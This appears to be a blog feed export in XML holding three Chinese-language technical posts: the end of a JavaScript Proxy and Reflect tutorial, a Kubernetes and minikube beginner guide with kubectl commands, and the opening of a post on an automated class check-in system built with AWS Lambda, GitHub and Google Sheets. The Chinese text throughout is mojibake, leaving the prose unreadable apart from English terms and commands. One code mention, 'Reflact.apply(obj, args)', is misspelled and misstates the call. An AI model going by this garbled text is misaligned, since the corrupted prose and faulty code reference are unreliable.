æ›´å„ªé›…ã€æ›´å¥½ç”¨çš„å›å‚³å€¼ä»¥å¾€ä½¿ç”¨ Object.defineProperty(obj, name, desc); æ™‚ï¼Œè‹¥æˆåŠŸï¼Œæœƒå›å‚³ objï¼Œå¤±æ•—å‰‡æœ‰å¯èƒ½æœƒæ‹‹å‡º Errorã€‚è€Œä½¿ç”¨ Reflect.defineProperty(obj, name, desc) çš„è©±ï¼Œå‰‡æœƒå›å‚³ boolean å€¼ï¼Œè®“å¤±æ•—æˆ–æˆåŠŸçš„çµæœæœ‰çµ±ä¸€çš„æ ¼å¼ã€‚

æ›´å¯é çš„ applyåœ¨ es5 æ™‚ï¼Œå¤§å®¶éƒ½å¾ˆç¿’æ…£é€é f.apply(obj, args) çš„æ–¹å¼ä¾† apply å‡½æ•¸åˆ°ç‰©ä»¶ä¸Šé ­ï¼Œä½†å¾ˆæœ‰å¯èƒ½åœ¨æŸäº›æƒ…æ³ä¸‹ï¼Œf.apply è¢«ä¸²æ”¹äº†ï¼Œé€™æ™‚å€™å°±æœƒæœ‰ä¸é æœŸçš„çµæœã€‚
Senior ä¸€é»çš„æœƒçŸ¥é“å¯ä»¥åˆ©ç”¨ Function.prototype.apply.call(f, obj, args) ä¾†å‘¼å«ï¼Œè‡³å°‘ prototype ä¸æœƒé¨™ä½ ï¼Œä½†é€™ç¨®æ–¹å¼ç¸½æ˜¯ä¸å¤ å„ªé›…ã€‚
ç¾åœ¨æœ‰äº† Reflect å¾Œï¼Œå°±ä¸éœ€è¦æ“”å¿ƒé€™ç¨®äº‹æƒ…ï¼Œé€é Reflact.apply(obj, args) å°±èƒ½è¼•é¬†é”åˆ°ä¸€æ¨£æ•ˆæœã€‚
æ¥å—å¯è®Šåƒæ•¸çš„ Constructoré€™å€‹å„ªé»åªæœ‰è·Ÿ ES5 æ¯”è¼ƒæ™‚æ‰æœ‰å„ªå‹¢ã€‚ä¸»è¦æ˜¯è®“ä½ èƒ½é€éï¼šconst obj = Reflect.construct(FooBar, args) ä¾†åœ¨å»ºæ§‹ç‰©ä»¶å¯¦ä¾‹æ™‚ï¼Œå‚³éå¯è®Šåƒæ•¸ï¼›è‹¥æ˜¯åœ¨ ES5 çš„ä¸–ç•Œï¼Œåªæœ‰ FooBar.apply æˆ– FooBar.call èƒ½å¤ æ¥å—è®Šå‹•åƒæ•¸ï¼Œä½†æ˜¯åœ¨ new ç‰©ä»¶å¯¦ä¾‹æ™‚ï¼Œä¸¦æ²’æœ‰ apply æˆ– call å¯ä»¥ä½¿ç”¨ã€‚
è€Œç¾åœ¨é€é ES6 çš„ spread syntaxï¼Œæˆ‘å€‘å¯ä»¥åœ¨å»ºæ§‹ç‰©ä»¶å¯¦ä¾‹æ™‚ï¼Œç›´æ¥å‚³éå¯è®Šåƒæ•¸ï¼šconst obj = new FooBar(...args)ã€‚


æœ€çµ‚ç¯„ä¾‹ï¼šåˆ©ç”¨ Proxy èˆ‡ Reflect å®Œæˆ one way data bindingåœ¨äº†è§£å®Œ Proxy èˆ‡ Reflect çš„åŸºæœ¬ä½¿ç”¨æ–¹å¼å¾Œï¼Œæƒ³åˆ†äº«ä¸€å€‹å¾ˆæœ‰è¶£çš„æ‡‰ç”¨ï¼Œä¹Ÿå°±æ˜¯æˆ‘é–‹é ­æåˆ°ï¼Œæ¿€ç™¼æˆ‘ç ”ç©¶ Proxy çš„ç¯„ä¾‹ï¼šframeworkless js one way data binding.
çµåˆå…ˆå‰æéçš„ Observe functionï¼Œä¾†å¯¦ä½œä¸€å€‹ç°¡å–® Todo Appï¼š
See the Pen Oneway-data-binding-js-proxy-reflect by Arvin (@arvin0731) on CodePen.


åŸºæœ¬ä¸Šæ˜¯çµåˆäº†ä¸Šè¿°ä»‹ç´¹çš„ Proxy èˆ‡ Reflect ç‰¹æ€§ï¼Œä¸¦èåˆé€™ç¯‡æ–‡ç« çš„ç¯„ä¾‹æ‰€è£½ä½œçš„ï¼Œå¦‚æœå¤§å®¶æœ‰çœ‹å®Œå‰é¢çš„ä»‹ç´¹ï¼Œå°æ–¼é€™æ®µ code æ‡‰è©²ä¸é›£ç†è§£ã€‚
ä¸»è¦æ˜¯é€é Proxy ä¾†ä»£ç† Object çš„ set èˆ‡ deleteProperty æ“ä½œï¼Œè®“ Todo list çš„è®Šå‹•èƒ½å¤ è¢«ä»£ç†ã€‚
æ­¤å¤–ï¼Œåœ¨å…ˆå‰çš„ä»‹ç´¹ä¸­ï¼Œéƒ½æ˜¯ä»¥ Object ç‚ºä¸»ï¼Œä½† todo app ç¯„ä¾‹ä¸­è¢« Proxy ä»£ç†çš„æ˜¯ Arrayã€‚
æœ€å¤§çš„å·®åˆ¥åœ¨æ–¼ï¼Œç•¶ä½  push ä¸€å€‹æ–° item é€²å…¥ Array æ™‚ï¼Œset æœƒè¢«å‘¼å«å…©æ¬¡ï¼Œä¸€æ¬¡æ˜¯æ–°çš„ item è¢«å¡å…¥é™£åˆ—æ™‚ï¼Œä¸€æ¬¡æ˜¯ Array çš„ length property åŠ ä¸€æ™‚ã€‚æ‰€ä»¥è¦ç‰¹åˆ¥æ¿¾æ‰ length æ›´å‹•çš„é‚£æ¬¡ä»£ç†æ“ä½œã€‚
æœ€å¾Œï¼Œåªè¦åœ¨ä»£ç†çš„æ“ä½œä¸­ï¼Œæƒ³è¾¦æ³•æŠŠ DOM åšå°æ‡‰çš„ä¿®æ”¹ï¼Œå¦‚åŒä¸Šé¢ç¨‹å¼ä¸­çš„ line 22 ~ line 40ï¼Œå®šç¾©ä¸€äº› render template çš„ function ä¾†æ›´æ–° DOM å³å¯ã€‚


çµè«–Javascript çš„è®Šå‹•ç¸½æ˜¯å¿«æ–¼ç€è¦½å™¨æ”¯æ´åº¦ï¼Œæ‰€ä»¥å¸¸å¸¸é€ æˆä¸€äº›æ–°çš„ Spec æˆ‘å€‘ä¸ç†Ÿæ‚‰ã€ä¸çŸ¥å¦‚ä½•é‹ç”¨ï¼Œé€™æ¬¡çš„ç ”ç©¶å­¸ç¿’äº†ä¸å°‘ï¼Œè€Œä¸Šé¢çš„ Todo App æ˜¯å€‹ç°¡é™‹ä¸åš´è¬¹çš„ç¯„ä¾‹ï¼Œä¸éä¹Ÿè¶³ä»¥å±•ç¾ Proxy èˆ‡ Reflect åœ¨å¯¦éš›é‹ç”¨ä¸Šçš„æƒ…å¢ƒï¼Œä¸¦å¸¶çµ¦æˆ‘å€‘å¦ä¸€ç¨®æ€è€ƒæ–¹å‘ï¼Œå¾ˆå¤šæ™‚å€™ä¸ç”¨ä¸€é–‹å§‹å°±å¥—ç”¨ Frameworkï¼Œé€éè¶Šä¾†è¶Šé€²æ­¥çš„ç€è¦½å™¨èˆ‡ ES ç‰ˆæœ¬ï¼Œæˆ‘å€‘ä¹Ÿèƒ½é”åˆ°ä¸€æ¨£ç›®çš„ã€‚é›–ç„¶æ¯”ä¸ä¸Š framework åŒ…å±±åŒ…æµ·çš„å„ªåŒ–ï¼Œä½†æˆ–è¨±èƒ½è®“æˆ‘å€‘æ›´äº†è§£å¯¦éš›è¦è§£æ±ºçš„å•é¡Œæ˜¯ä»€éº¼ï¼Œä»¥åŠè§£æ±ºæ–¹æ³•èƒŒå¾Œçš„æ¦‚å¿µã€‚


è³‡æ–™ä¾†æº
Frameworkless JavaScript Part 3: One-Way Data Binding
MDN Proxy
ES6 ä¹‹ Proxy ä»‹ç»
ECMAScript 6 å…¥é—¨

é—œæ–¼ä½œè€…ï¼š@arvinh å‰ç«¯æ”»åŸç…ï¼Œç†±æ„›æ•¸æ“šåˆ†æå’Œè³‡è¨Šè¦–è¦ºåŒ–
]]></content>
      <tags>
        <tag>es6</tag>
        <tag>javascript</tag>
        <tag>proxy</tag>
        <tag>reflect</tag>
        <tag>frameworkless</tag>
      </tags>
  </entry>
  <entry>
    <title>Kubernetes èˆ‡ minikube å…¥é–€æ•™å­¸</title>
    <url>/2018/12/01/kubernetes101-introduction-tutorial/</url>
    <content><![CDATA[ 
å‰è¨€Kubernetesï¼ˆåˆç¨± K8sï¼Œé¡ä¼¼æ–¼ i18n&#x2F;l10nï¼Œå–ä¸­é–“å­—æ¯çš„é•·åº¦çš„ç°¡å¯«å‘½åï¼‰æ˜¯ä¸€å€‹å”åŠ©æˆ‘å€‘è‡ªå‹•åŒ–éƒ¨ç½²ï¼ˆautomating deploymentï¼‰ã€è‡ªå‹•æ“´å±•ï¼ˆscalingï¼‰å’Œç®¡ç†å®¹å™¨æ‡‰ç”¨ç¨‹å¼ï¼ˆcontainerized applicationsï¼‰çš„æŒ‡æ®èª¿åº¦ï¼ˆOrchestrationï¼‰å·¥å…·ã€‚ç›¸æ¯”æ–¼å‚³çµ±çš„æ‰‹å‹•éƒ¨å±¬å®¹å™¨æ‡‰ç”¨ç¨‹å¼çš„æ–¹å¼ï¼ŒKubernetes ä¸»è¦æœ‰å¹¾å€‹å¥½è™•ï¼š

Automated rollouts and rollbacksKubernetes å¯ä»¥å¾ˆå®¹æ˜“æ›´æ–°å®¹å™¨ç‰ˆæœ¬ä¸¦ rollback å›ä¹‹å‰ç‰ˆæœ¬

Service Scalabilityç•¶å®šç¾©å¥½éƒ¨å±¬æœå‹™éœ€æ±‚ï¼Œå¯ä»¥å¾ˆå®¹æ˜“å› æ‡‰æµé‡é€²è¡Œ Auto Scaling

Service discovery and load balancingè‡ªå‹•åˆ†é…å®¹å™¨ç›¸å°æ‡‰çš„ IP ä½å€ï¼Œé€é Service cluster é”åˆ° load balancing æ•ˆæœ

Self-healingç•¶ Container Application å‡ºç¾ crash æ™‚ï¼Œå¯ä»¥æ ¹æ“šéƒ¨å±¬å®šç¾©çš„éœ€æ±‚ï¼Œè‡ªå‹•åµæ¸¬é‡å•Ÿæœå‹™


 
Kubernetes æ¶æ§‹ç°¡ä»‹Kubernetes cluster ä¸»è¦å¯ä»¥åˆ†ç‚º Master å’Œ Node å…©éƒ¨ä»½ï¼ŒMaster è² è²¬æŒ‡æ®èª¿åº¦ Nodeã€‚åœ¨ Kubernetes ä¸–ç•Œè£¡ï¼ŒNode ä¸Šçš„ Pod æ˜¯é‹è¡Œèª¿åº¦çš„æœ€å°å–®ä½ï¼Œè£¡é¢å¯ä»¥æ”¾å¤šå€‹ containerï¼ˆä¸€èˆ¬ä»¥æœ‰ç·Šå¯†ç›¸é—œçš„æœå‹™ç‚ºä¸»ï¼ŒåŒä¸€å€‹ Pod å…±äº« IPï¼‰ï¼Œä¹Ÿå¯ä»¥åªæœ‰å–®å€‹ Containerï¼ŒåŒä¸€å€‹ Pod çš„ container æ˜¯ä¸€èµ·è¢«èª¿åº¦ã€‚è€Œ Deployment ç‚ºç®¡ç† Pod çš„ Controllerï¼Œæˆ‘å€‘å¯ä»¥è¦–ä¸€çµ„ Deployment ç‚ºä¸€çµ„æ‡‰ç”¨æœå‹™ã€‚è€Œ Service å¯ä»¥å›ºå®šä½æˆ‘å€‘å°å¤–æœå‹™çš„ IPï¼Œä¸æœƒå› ç‚º Pod é—œé–‰é‡å•Ÿè€Œå–ªå¤±åŸä¾†çš„ IP ä½ç½®ã€‚
ç’°å¢ƒè¨­å®š
Minikube is a tool that makes it easy to run Kubernetes locally. Minikube runs a single-node Kubernetes cluster inside a VM on your laptop for users looking to try out Kubernetes or develop with it day-to-day

åœ¨é–‹å§‹å­¸ç¿’è·‘æ­¥ä¹‹å‰ï¼Œæˆ‘å€‘å…ˆå­¸æœƒèµ°è·¯ã€‚é¦–å…ˆï¼Œæˆ‘å€‘é€é minikube é€™å€‹å¯ä»¥åœ¨æœ¬åœ°ç«¯è·‘ Kubernetes å·¥ä½œï¼Œä¾†åœ¨æœ¬åœ°ç«¯éƒ¨å±¬æˆ‘å€‘çš„ Kubernetes clusterï¼Œæ„Ÿå—ä¸€ä¸‹ k8s çš„æ‡‰ç”¨ã€‚ç”±æ–¼ minikube åªæä¾› signle-node Kubernetes Clusterï¼Œæœ¬èº«ä¸¦ä¸æ”¯æ´ HA (High availability)ï¼Œæ‰€ä»¥ä¸æ¨è–¦åœ¨å¯¦éš›æ‡‰ç”¨ä¸Šé‹è¡Œå‘¦ã€‚
åœ¨é–‹å§‹æ“ä½œä¹‹å‰æˆ‘å€‘å…ˆæº–å‚™å¥½ï¼š

virtualboxï¼ˆå¯ä»¥æ ¹æ“šå°æ‡‰ä½œæ¥­ç³»çµ±ä¸‹è¼‰å°æ‡‰ç‰ˆæœ¬ï¼‰ï¼Œ
æ¥è‘—é€é homebrew ä¸‹æŒ‡ä»¤ä¾†å®‰è£ minikubeï¼ˆæˆ‘å€‘é€™é‚Šæœƒä»¥ macOS ç‚ºä¸»ï¼Œè‹¥æ˜¯å…¶ä»–ä½œæ¥­ç³»çµ±å¯ä»¥åƒè€ƒ minikube å®˜æ–¹ repo æ•™å­¸ï¼‰

$ brew cask install minikube

å®‰è£å¥½å¾Œå¯ä»¥é€éä»¥ä¸‹æŒ‡ä»¤ç¢ºèªç‰ˆæœ¬ï¼ŒåŒæ™‚å®ƒä¹Ÿæœƒä¸€èµ·å®‰è£ kubectl é€™å€‹ Kubernetes æŒ‡ä»¤æ“ä½œå·¥å…· kubectl
$ minikube versionminikube version: v0.30.0

å‰µå»º clusteræ¥è‘—å•Ÿå‹•æˆ‘å€‘ Kubernetes cluster
$ minikube startStarting local Kubernetes v1.10.0 cluster...Starting VM...Downloading Minikube ISO 170.78 MB / 170.78 MB [============================================] 100.00% 0sGetting VM IP address...Moving files into cluster...Downloading kubelet v1.10.0Downloading kubeadm v1.10.0Finished Downloading kubelet v1.10.0Finished Downloading kubeadm v1.10.0Setting up certs...Connecting to cluster...Setting up kubeconfig...Starting cluster components...Kubectl is now configured to use the cluster.Loading cached images from config file.

è‹¥æ˜¯å•Ÿå‹•å®Œæˆå¯ä»¥é€éä»¥ä¸‹æŒ‡ä»¤è§€çœ‹ cluster æƒ…æ³ï¼š
$ kubectl cluster-info

æŸ¥çœ‹ minikube çš„ç‹€æ…‹ï¼š
$ minikube statusminikube: Runningcluster: Runningkubectl: Correctly Configured: pointing to minikube-vm at 192.168.99.100

é‚„å¯ä»¥é€éåœ–å½¢åŒ–ä»‹é¢ä¾†è§€çœ‹å’Œæ“ä½œ Kubernetes
$ minikube dashboard

 
éƒ¨å±¬æ‡‰ç”¨æ¥è‘—æˆ‘å€‘ä¾†éƒ¨å±¬ä¸€å€‹ç°¡å–®ç¯„ä¾‹æ‡‰ç”¨åˆ° Kubernetesã€‚é€™å€‹æ‡‰ç”¨åç¨±å« docker-python-flask-demoï¼Œæ˜¯ä¸€å€‹ Dockerize Simple Flask App ã€‚kubectl run å¯ä»¥è®“æˆ‘å€‘å•Ÿå‹•æˆ‘å€‘çš„ Podï¼Œâ€“image å¾Œé¢æ¥çš„æ˜¯ docker image ä½ç½®å’Œç‰ˆæœ¬ï¼Œâ€“port å‰‡æ˜¯ container å°å¤–çš„ port
$ kubectl run docker-python-flask-demo --image=docker.io/kdchang/docker-python-flask-demo:v1 --port 3000

æ‡‰è©²å¯ä»¥çœ‹åˆ° docker-python-flask-demo-xxxxxxxx çš„ Pod å·²ç¶“å•Ÿå‹•ï¼š
$ kubectl get pods

å°å¤–å…¬é–‹æ‡‰ç”¨ç”±æ–¼ default æƒ…æ³ä¸‹ Pod åªå…è¨± cluster å…§éƒ¨è¨ªå•ï¼Œè‹¥æ˜¯è¦è®“å¤–éƒ¨å¯ä»¥è¨ªå•çš„è©±å¯ä»¥å°‡å®¹å™¨çš„ port å°æ‡‰åˆ° Node çš„ Portï¼ˆCluster IP æ˜¯åªèƒ½å…§éƒ¨è¨ªå•ï¼Œkubectl expose å‰‡æ˜¯æŠŠ deployment expose æˆç‚ºä¸€å€‹å°å¤– serviceï¼Œtype NodePort å¯ä»¥æŠŠ Deployment é€é Kubernetes Cluster çš„ port è®“ Cluster å¤–éƒ¨å¯ä»¥è¨ªå•ï¼‰
$ kubectl expose deployment/docker-python-flask-demo --type=&quot;NodePort&quot; --port 3000service/docker-python-flask-demo exposed

çœ‹ä¸€ä¸‹ service åˆ—è¡¨ï¼Œç™¼ç¾å·²ç¶“éš¨æ©Ÿåˆ†é…ä¸€å€‹ port 31862 ï¼ˆæ³¨æ„è®€è€…ç”¢ç”Ÿçš„ port æœ‰å¯èƒ½ä¸ä¸€æ¨£ï¼‰
$ kubectl get servicesNAME                       TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)          AGEdocker-python-flask-demo   NodePort    10.100.20.174    &lt;none&gt;        3000:32743/TCP   2s

$ kubectl service docker-python-flask-demo --urlhttp://192.168.99.100:32743

å¯ä»¥çœ‹åˆ° service å°‡ deployment&#x2F;docker-python-flask-demo çš„ port number 3000 èˆ‡ minikube-vm ä¸Šçš„ port number 32743 åš mappingæ¥è‘—å¯ä»¥ä½¿ç”¨ minukube service çš„æŒ‡ä»¤å¿«é€Ÿæ‰¾åˆ° docker-python-flask-demo çš„ urlï¼Œé€™æ¨£æˆ‘å€‘å°±å¯ä»¥åœ¨ç€è¦½å™¨è¼¸å…¥ç¶²å€çœ‹åˆ°æˆæœå›‰ï¼š
 
æ“´å……æ‡‰ç”¨ç”±æ–¼ default æƒ…æ³ä¸‹ deployment åªæœƒæœ‰ä¸€å€‹å‰¯æœ¬ replicationï¼Œæˆ‘å€‘å¯ä»¥é€éä»¥ä¸‹æŒ‡ä»¤æŸ¥çœ‹å‰¯æœ¬æ•¸ï¼š
$ kubectl get deploymentsNAME                       DESIRED   CURRENT   UP-TO-DATE   AVAILABLE   AGEdocker-python-flask-demo   1         1         1            1           23m

è¨­å®šå‰¯æœ¬æ•¸é‡ç‚º 3ï¼š
$ kubectl scale deployments/docker-python-flask-demo --replicas=3deployment.extensions/docker-python-flask-demo scaled

æˆ‘å€‘å¯ä»¥çœ‹åˆ°åŸæœ¬çš„å‰¯æœ¬æ•¸é‡å¾ 1 è®Šæˆäº† 3ï¼š
$ kubectl get deploymentsNAME                       DESIRED   CURRENT   UP-TO-DATE   AVAILABLE   AGEdocker-python-flask-demo   3         3         3            3           25m

è¨­å®šå‰¯æœ¬æ•¸é‡ç‚º 2ï¼š
$ kubectl get deploymentsNAME                       DESIRED   CURRENT   UP-TO-DATE   AVAILABLE   AGEdocker-python-flask-demo   2         2         2            2           26m

æ›´æ–°æ‡‰ç”¨è‹¥æ˜¯æˆ‘å€‘æƒ³è¦æ›´æ–° container çš„ç‰ˆæœ¬çš„è©±å¯ä»¥ä¸‹ä»¥ä¸‹æŒ‡ä»¤ï¼ˆä¹Ÿå°±æ˜¯èªªåŸæœ¬ docker image tag v1 ç‰ˆæœ¬æ”¹é€²åˆ° v2 ç‰ˆæœ¬ï¼Œæˆ‘å€‘å¯ä»¥é€éæ›´æ–° docker image ä¾†é€²è¡Œé€²ç‰ˆï¼‰ï¼š
$ kubectl set image deployments/docker-python-flask-demo docker-python-flask-demo=docker.io/kdchang/docker-python-flask-demo:v2deployment.extensions/docker-python-flask-demo image updated

æ­¤æ™‚æˆ‘å€‘åœ¨åˆ°ç€è¦½å™¨é‡æ–°æ•´ç† http://192.168.99.100:32743/ï¼Œå°±æœƒç™¼ç¾ç•«é¢ä¸­çš„ Flask Dockerized v1 è®Šæˆäº† Flask Dockerized v2ï¼
 
è‹¥è¦å›åˆ° v1 ç‰ˆæœ¬å¯ä»¥é€é rollout undo æŒ‡ä»¤ä¾†é€²è¡Œï¼š
$ kubectl rollout undo deployments/docker-python-flask-demodeployment.extensions/docker-python-flask-demo

åˆå›åˆ° v1 æƒ¹ï¼
 
ç¸½çµä»¥ä¸Šç°¡å–®é€é minikube ä»‹ç´¹ Kubernetes çš„æ¶æ§‹å’Œéƒ¨å±¬ cluster å’Œæ‡‰ç”¨åœ¨æœ¬åœ°ç«¯ï¼Œå¯¦éš›ä¸Šæˆ‘å€‘å¯ä»¥é€éé›²ç«¯æœå‹™ä¾†éƒ¨å±¬æˆ‘å€‘çš„ Kubernetes æ‡‰ç”¨ï¼Œminikube ä¸»è¦æ˜¯ç”¨åœ¨ç·´ç¿’å’Œæ•™å­¸ä½¿ç”¨ï¼Œä¸å»ºè­°ä½¿ç”¨åœ¨ç”Ÿç”¢ç’°å¢ƒä¸Šã€‚ç›®å‰ Kubernetes ç”Ÿæ…‹ç³»ç™¼å±•éå¸¸å¿«é€Ÿï¼Œç‰ˆæœ¬ä¹ŸæŒçºŒæ›´æ–°ã€‚é—œæ–¼ Kubernetes ç›¸é—œçš„å¯¦éš›æ‡‰ç”¨ï¼Œæˆ‘å€‘ä¸‹å›å†ç¹¼çºŒè¨è«–å›‰ï¼
é—œæ–¼ä½œè€…ï¼š@kdchang æ–‡è—å‹é–‹ç™¼è€…ï¼Œå¤¢æƒ³æ˜¯åšå‡ºäººå€‘æƒ³ç”¨çš„ç”¢å“å’Œè¾¦ä¸€æ‰€å¿ƒç›®ä¸­ç†æƒ³çš„å­¸æ ¡ã€‚A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>container</tag>
        <tag>å®¹å™¨</tag>
        <tag>Kubernetes</tag>
        <tag>minikube</tag>
        <tag>é›²ç«¯</tag>
        <tag>cloud native</tag>
      </tags>
  </entry>
  <entry>
    <title>AWS Lambda + GitHub API + Google Sheet = è‡ªå‹•åŒ–ç°½åˆ°ç³»çµ±</title>
    <url>/2018/09/14/lambda-and-github-api/</url>
    <content><![CDATA[å‰è¨€é€™ä¸€å¹´é–“æˆ‘åˆ©ç”¨é–’æš‡ä¹‹é¤˜å˜—è©¦é€²è¡Œäº†å¹¾å ´æ•™å­¸å¯¦é©—ï¼Œå¸Œæœ›èƒ½é€éæŒçºŒçš„æ•™å­¸æ”¹é€²è‡ªå·±çš„æ•™æï¼Œå¾å­¸ç”Ÿçš„åé¥‹ç•¶ä¸­å¾—åˆ°ä¸€äº›å¿ƒå¾—ã€‚
è€Œåœ¨é€²è¡Œé€™äº›æ•™å­¸å¯¦é©—çš„æ™‚å€™ï¼Œæˆ‘å¸¸å¸¸åœ¨æƒ³å¯ä»¥é€éå“ªäº›ç¾æˆçš„æœå‹™æ¸›å°‘æˆ‘çš„è² æ“”ï¼Œç•¢ç«Ÿèº«ç‚ºå·¥ç¨‹å¸«å˜›ï¼Œå¾ˆæƒ³æŠŠä¸€äº›ç‘£ç¢çš„äº‹å‹™è‡ªå‹•åŒ–ï¼Œé•·æœŸä¸‹ä¾†å¯ä»¥ç¯€çœçš„æ™‚é–“æ˜¯å¾ˆå¯è§€çš„ã€‚
åŠå¹´å‰æœ‰äº†ç¬¬ä¸€æ¬¡å˜—è©¦ï¼Œä¹Ÿåœ¨é€™é‚Šåˆ†äº«äº†å¿ƒå¾—ï¼šåˆ©ç”¨ Github Classroom åŠ  Travis CI æ‰“é€ æ”¹ä½œæ¥­ç³»çµ±ï¼Œæœ‰äº†è‡ªå‹•æ”¹ä½œæ¥­ç³»çµ±ä»¥å¾Œï¼Œç¢ºå¯¦çœä¸‹ä¸å°‘éº»ç…©ã€‚
é€™æ¬¡è¦ä¾†åˆ†äº«çš„æ˜¯å…©é€±å‰ç”¨å¤§æ¦‚ä¸€å…©å¤©çš„æ™‚é–“å¿«é€Ÿå¯¦ä½œå‡ºä¾†çš„è‡ªå‹•åŒ–ç°½åˆ°ç³»çµ±ã€‚
ç‚ºä»€éº¼è¦ç°½åˆ°ç³»çµ±ï¼Ÿç‚ºäº†æŒæ¡å­¸ç”Ÿçš„é€²åº¦ä»¥åŠç¢ºä¿å­¸ç”Ÿæ˜¯çœŸçš„æœ‰å¿ƒè¦æŒçºŒä¸Šèª²ï¼Œæˆ‘åœ¨ä¸Šä¸€æ¬¡æ•™å­¸å¯¦é©—æ™‚å°±å¼•é€²äº†æˆ‘åœ¨å…¬å¸è£¡é¢æ¯å¤©å¿…åšçš„ Daily Stand-up meetingï¼Œæ¯å€‹äººå¿«é€Ÿåˆ†äº«ä¸€ä¸‹è‡ªå·±æ˜¨å¤©åšäº†ä»€éº¼ã€ä»Šå¤©è¦åšä»€éº¼ä»¥åŠæœ‰æ²’æœ‰ä»»ä½•äº‹æƒ…é˜»æ­¢ä½ å®Œæˆé€™äº›ä»»å‹™ã€‚
é‚£æ™‚å€™æˆ‘ç”¨çš„æ–¹æ³•æ˜¯è®“æ¯å€‹äººåœ¨ Slack çš„ channel è£¡é¢ç”¨å›ºå®šæ ¼å¼ po é€™äº›æ±è¥¿ï¼š

å„ªé»æ˜¯é›†ä¸­åœ¨ä¸€å€‹åœ°æ–¹ï¼Œå¾ˆæ–¹ä¾¿è§€çœ‹ï¼Œè€Œç¼ºé»å°±æ˜¯æˆ‘åªèƒ½ç”¨è‚‰çœ¼çœ‹è€Œå·²ï¼Œæ²’è¾¦æ³•è¨˜éŒ„ä¸‹ä¾†ã€‚æ„æ€å°±æ˜¯èªªå¦‚æœæˆ‘æƒ³è¦è£½ä½œä¸€å€‹æœ‰å“ªäº›å­¸ç”Ÿæ²’æœ‰ po çš„è¡¨å–®ï¼Œæˆ‘åªèƒ½ä¸€å€‹ä¸€å€‹è‡ªå·±å¡«ã€‚
ä¸Šä¸€æ¬¡æ™‚å› ç‚ºå­¸ç”Ÿäººæ•¸å°‘ï¼Œè€Œä¸” po é€™å€‹ä¹Ÿä¸æ˜¯å¼·åˆ¶çš„ï¼Œæ‰€ä»¥ä¸æˆå•é¡Œï¼Œä½†åœ¨é€™ä¸€æ¬¡çš„æ•™å­¸å¯¦é©—è£¡é¢æˆ‘å¼•å…¥äº†æ·˜æ±°åˆ¶ï¼Œåœ¨ä¸€å®šæœŸé–“å…§å¦‚æœç¼ºäº¤é€²åº¦å ±å‘Šå¤ªå¤šæ¬¡æ˜¯æœƒè¢«æ·˜æ±°é€€å‡ºèª²ç¨‹çš„ã€‚
æ—¢ç„¶æœ‰äº†é€™å€‹æ©Ÿåˆ¶ï¼Œæˆ‘å°±å¿…é ˆè¦æŠŠé€™äº›é€²åº¦å ±å‘Šçµ¦è¨˜éŒ„èµ·ä¾†ï¼Œè¦è¨˜éŒ„å“ªäº›äººå“ªäº›æ—¥å­æ˜¯æ²’æœ‰å ±å‘Šçš„ã€‚å¦‚æ­¤ä¸€ä¾†ï¼Œå°±å¿…é ˆè¦æœ‰ä¸€å€‹æ›´å®Œæ•´çš„ç°½åˆ°ç³»çµ±æ‰è¡Œï¼Œæˆ‘æƒ³é”æˆçš„ç›®çš„æœ‰ï¼š

æˆ‘è¦å¯ä»¥åœ¨ slack channel è£¡é¢çœ‹è¦‹æ¯å€‹äººçš„é€²åº¦å ±å‘Š
æˆ‘è¦æœ‰å€‹åœ°æ–¹å¯ä»¥è¨˜éŒ„æ¯å¤©æ¯å€‹å­¸ç”Ÿæœ‰æ²’æœ‰ po é€²åº¦å ±å‘Šï¼ˆå°±æŠŠé€™å€‹ç¨±ä½œç°½åˆ°ï¼‰

è©²å¦‚ä½•è£½ä½œé€™å€‹ç°½åˆ°ç³»çµ±ï¼Ÿæˆ‘çš„ç¬¬ä¸€å€‹æƒ³æ³•å°±æ˜¯ä½¿ç”¨ Google è©¦ç®—è¡¨ï¼Œç•¢ç«Ÿé€™å€‹æ±è¥¿æœ€æ–¹ä¾¿å˜›ï¼Œæ©«è»¸å¡«å…¥æ¯å€‹å­¸ç”Ÿçš„å¸³è™Ÿï¼Œç¸±è»¸å¡«å…¥æ¯å¤©çš„æ—¥æœŸï¼Œå¦‚æœæœ‰å ±å‘Šå°±çµ¦ä¸€å€‹è¨˜è™Ÿï¼Œæ²’å ±å‘Šå°±ç©ºç™½ï¼Œé€™æ¨£æˆ‘å°±å¯ä»¥å¾ˆæ˜ç¢ºåœ°çœ‹å‡ºç°½åˆ°ç´€éŒ„äº†ï¼Œæˆå“é•·å¾—åƒé€™æ¨£ï¼š

é€™æ¨£å­å°±å®Œæˆç¬¬äºŒå€‹éœ€æ±‚äº†ï¼Œå‰©ä¸‹ä¾†çš„å°±æ˜¯æƒ³èªªå¦‚ä½•å®Œæˆç¬¬ä¸€å€‹éœ€æ±‚ã€‚æœ€ç°¡å–®çš„æ–¹å¼å°±æ˜¯è·Ÿä¹‹å‰ä¸€æ¨£ï¼Œè®“å­¸ç”Ÿåœ¨æŸå€‹ channel è£¡é¢æ¯å¤©è‡ªå·± po å°±å¥½ï¼Œç„¶å¾Œæˆ‘å¯«å€‹ç¨‹å¼ä¾†ä¸² Slack çš„ webhookï¼Œæ¥æ”¶åˆ°è³‡æ–™å°±å¯«é€² Google è©¦ç®—è¡¨è£¡é¢ã€‚
é€™å€‹è§£æ±ºæ–¹æ¡ˆçœ‹ä¼¼ä¸éŒ¯ï¼Œå¯æ˜¯æœ‰å€‹å•é¡Œæ˜¯èª²ç¨‹ç”¨çš„ workspace æ˜¯å…è²»ç‰ˆçš„ï¼Œè¨Šæ¯åˆ°ä¸€å®šé‡ä¹‹å¾Œå°±æœƒè¢«åƒæ‰ï¼Œå°±çœ‹ä¸åˆ°ä»¥å‰çš„é€²åº¦å ±å‘Šï¼Œæˆ‘è¦ºå¾—é€™æ˜¯æœ‰é»å¯æƒœçš„ï¼Œæ‰€ä»¥é€™å€‹æ–¹æ¡ˆè¡Œä¸é€šã€‚
æ¥è‘—æˆ‘å°±æƒ³åˆ°å¦ä¸€å€‹æ›´ä¸éŒ¯çš„è§£æ±ºæ–¹æ¡ˆï¼š

è®“å­¸ç”Ÿåœ¨ GitHub çš„ Issue ä¸‹é¢ç•™è¨€
ç•™è¨€åŒæ­¥åˆ° Slack channel
ä¸²æ¥ GitHub Webhookï¼ŒåŒæ­¥æŠŠç´€éŒ„å¯«åˆ°è©¦ç®—è¡¨è£¡é¢

